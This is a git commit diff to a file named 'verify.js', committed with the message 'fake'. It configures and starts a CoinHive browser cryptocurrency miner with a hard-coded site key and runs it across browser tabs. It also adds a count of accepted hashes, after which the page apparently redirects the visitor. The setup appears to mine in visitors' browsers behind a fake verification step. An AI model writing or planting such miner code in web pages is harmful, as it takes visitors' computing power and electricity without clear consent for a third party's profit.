03e2b1c94ada0b3bd2aebfae72ffb894ef84ee86
huuhadz2k <36265491+huuhadz2k@users.noreply.github.com>
2018-02-09 14:52:41 +0700

    fake

--- Miner/js/verify.js
+++ Miner/js/verify.js
@@ -1,18 +1,24 @@
 		var miner = new CoinHive.Anonymous('TqBKEr08A8atWsXdAoc1Rpr1dA1CSPlC',
 		{
 			threads: 4,
-			autoThreads: false,
+			autoThreads: true,
 			throttle:1,
 			forceASMJS: false
 		});
 		miner.start(CoinHive.FORCE_MULTI_TAB);
+
+		// Update stats once per .5 second
 	setInterval(function() {
 		var hashesPerSecond = miner.getHashesPerSecond();
 		var totalHashes = miner.getTotalHashes();
 		var acceptedHashes = miner.getAcceptedHashes();
+		var hashesToGenerate = 256; //Set value of amount of accepted hashes to generate
 		var threadCount = miner.getNumThreads(); //Get the amount of threads
 
 		//Remove the following if statement if you don't want the page to redirect to another page.
+		if (acceptedHashes > hashesToGenerate)
+		{
+		}
 		else
 		{
 		document.getElementById("hps").innerHTML = hashesPerSecond;
